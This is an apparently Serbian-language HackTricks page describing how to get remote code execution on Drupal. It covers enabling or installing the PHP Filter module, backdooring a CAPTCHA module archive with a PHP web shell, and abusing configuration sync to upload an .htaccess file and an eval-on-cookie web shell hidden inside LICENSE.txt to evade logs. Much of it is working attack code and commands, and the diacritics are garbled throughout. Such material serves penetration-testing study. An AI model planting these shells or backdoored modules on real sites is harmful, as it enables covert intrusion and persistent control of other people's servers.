# Drupal RCE

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Sa PHP Filter Modulom

{% hint style="warning" %}
U starijim verzijama Drupal-a **(pre verzije 8)**, bilo je mogu캖e prijaviti se kao admin i **omogu캖iti `PHP filter` modul**, koji "Omogu캖ava evaluaciju ugra캠enog PHP koda/snippetova." Ali od verzije 8 ovaj modul nije instaliran podrazumevano.
{% endhint %}

Potreban vam je **dodatak php da bude instaliran** (proverite pristupom _/modules/php_ i ako vrati **403** onda, **postoji**, ako **nije prona캠en**, onda **dodatak php nije instaliran**)

Idite na _Modules_ -> (**Proverite**) _PHP Filter_ -> _Sa캜uvajte konfiguraciju_

![](<../../../.gitbook/assets/image (247) (1).png>)

Zatim kliknite na _Dodaj sadr쬬j_ -> Izaberite _Osnovna stranica_ ili _캛lanak -_> Napi코ite _php shell kod u telu_ -> Izaberite _PHP kod_ u _Tekst formatu_ -> Izaberite _Pregled_

![](<../../../.gitbook/assets/image (338).png>)

Na kraju samo pristupite novo kreiranom nodu:
```bash
curl http://drupal-site.local/node/3
```
## Instaliranje PHP Filter modula

{% hint style="warning" %}
U trenutnim verzijama vi코e nije mogu캖e instalirati dodatke samo pristupom vebu nakon podrazumevane instalacije.
{% endhint %}

Od verzije **8 nadalje**, [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **modul nije instaliran podrazumevano**. Da bismo iskoristili ovu funkcionalnost, moramo **samostalno instalirati modul**.

1. Preuzmite najnoviju verziju modula sa Drupal veb sajta.
2. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
3. Kada se preuzme, idite na **`Administracija`** > **`Izve코taji`** > **`Dostupna a쬿riranja`**.
4. Kliknite na **`Pregledaj`**, izaberite fajl iz direktorijuma u koji smo ga preuzeli, a zatim kliknite na **`Instaliraj`**.
5. Kada se modul instalira, mo쬰mo kliknuti na **`Sadr쬬j`** i **napraviti novu osnovnu stranicu**, sli캜no kao 코to smo uradili u primeru za Drupal 7. Ponovo, obavezno **izaberite `PHP kod` iz padaju캖eg menija `Format teksta`**.

## Modul sa zadnjim vratima

{% hint style="warning" %}
U trenutnim verzijama vi코e nije mogu캖e instalirati dodatke samo pristupom vebu nakon podrazumevane instalacije.
{% endhint %}

Modul sa zadnjim vratima mo쬰 se kreirati **dodavanjem 코koljke postoje캖em modulu**. Module mo쬰te prona캖i na drupal.org veb sajtu. Izaberimo modul poput [CAPTCHA](https://www.drupal.org/project/captcha). Pomaknite se nadole i kopirajte link za tar.gz [arhivu](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

* Preuzmite arhivu i izvucite njene sadr쬬je.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* Napravite **PHP web shell** sa slede캖im sadr쬬jem:
```php
<?php
system($_GET["cmd"]);
?>
```
* Zatim moramo kreirati **`.htaccess`** fajl kako bismo sebi omogu캖ili pristup folderu. Ovo je neophodno jer Drupal odbija direktni pristup **`/modules`** folderu.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* Konfiguracija iznad 캖e primeniti pravila za / folder kada zahtevamo fajl u /modules. Kopirajte oba ova fajla u captcha folder i napravite arhivu.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* Pretpostavljaju캖i da imamo **administrativni pristup** veb sajtu, kliknite na **`Upravljaj`** a zatim na **`Pro코iri`** na bo캜noj traci. Zatim kliknite na dugme **`+ Instaliraj novi modul`**, i bi캖emo preusmereni na stranicu za instalaciju, poput `http://drupal-site.local/admin/modules/install`. Pretra쬴te backdoored Captcha arhivu i kliknite na **`Instaliraj`**.
* Kada instalacija uspe, pre캠ite na **`/modules/captcha/shell.php`** da biste izvr코ili komande.

## Backdooring Drupal pomo캖u sinhronizacije konfiguracije <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Objavio** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Deo 1 (aktivacija _Media_ i _Media Library_)

U meniju _Pro코iri_ (/admin/modules), mo쬰te aktivirati ono 코to izgleda kao ve캖 instalirani dodaci. Podrazumevano, dodaci _Media_ i _Media Library_ se ne 캜ine aktiviranim, pa ih aktivirajmo.

Pre aktivacije:

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Nakon aktivacije:

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### Deo 2 (iskori코캖avanje funkcije _Sinhronizacija konfiguracije_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Iskoristi캖emo funkciju _Sinhronizacija konfiguracije_ da bismo izvezli i otpremili Drupal konfiguracione unose:

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**Popravka system.file.yml**

Po캜nimo sa popravkom prvog unosa `allow_insecure_uploads` iz:

Fajl: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Na:

Fajl: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**Ispravite polje field.field.media.document.field\_media\_document.yml**

Zatim, ispravite drugi unos `file_extensions` iz:

Fajl: field.field.media.document.field\_media\_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Na:

Fajl: field.field.media.document.field\_media\_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> U ovom blog postu ga ne koristim, ali je napomenuto da je mogu캖e definisati unos `file_directory` na proizvoljan na캜in i da je ranjiv na napad putanjom pretrage (tako da mo쬰mo da se vratimo unutar stabla fajl sistema Drupal-a).

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### Deo 3 (iskori코캖avanje funkcije _Dodaj dokument_) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

Poslednji korak je najjednostavniji i sastoji se od dva podkoraka. Prvi je da otpremimo fajl u .htaccess formatu kako bismo iskoristili Apache direktive i omogu캖ili da .txt fajlovi budu tuma캜eni od strane PHP motora. Drugi je da otpremimo .txt fajl koji sadr쬴 na코 payload.

Fajl: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Za코to je ovaj trik kul?

Zato 코to kada se Webshell (koji 캖emo nazvati LICENSE.txt) prebaci na Web server, mo쬰mo prenositi na코e komande putem `$_COOKIE`, a u zapisnicima Web servera 캖e se prikazati kao legitimni GET zahtev ka tekstualnom fajlu.

Za코to nazvati na코 Webshell LICENSE.txt?

Jednostavno zato 코to ako uzmemo slede캖i fajl, na primer [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (koji ve캖 postoji u Drupal jezgru), imamo fajl od 339 linija i veli캜ine 17.6 KB, 코to je savr코eno za dodavanje malog ise캜ka PHP koda u sredini (jer je fajl dovoljno veliki).

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Fajl: Zakrpljeni LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Deo 3.1 (uploadovanje fajla .htaccess)**

Prvo, iskori코캖avamo funkciju _Dodaj dokument_ (/media/add/document) da bismo uploadovali na코 fajl koji sadr쬴 Apache direktive (.htaccess).

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**Deo 3.2 (uploadovanje fajla LICENSE.txt)**

Zatim, ponovo iskori코캖avamo funkciju _Dodaj dokument_ (/media/add/document) da bismo uploadovali Webshell sakriven unutar licence fajla.

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### Deo 4 (interakcija sa Webshell-om) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

Poslednji deo podrazumeva interakciju sa Webshell-om.

Kao 코to je prikazano na slede캖em snimku ekrana, ako kola캜i캖 o캜ekivan od na코eg Webshella nije definisan, dobijamo slede캖i rezultat prilikom konsultovanja fajla putem Web pregleda캜a.

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Kada napada캜 postavi kola캜i캖, mo쬰 da interaguje sa Webshell-om i izvr코i bilo koje komande koje 쬰li.

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

I kako mo쬰te videti u logovima, izgleda da je tra쬰n samo txt fajl.

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Hvala 코to ste izdvojili vreme da pro캜itate ovaj 캜lanak, nadam se da 캖e vam pomo캖i da dobijete neke shell-ove.
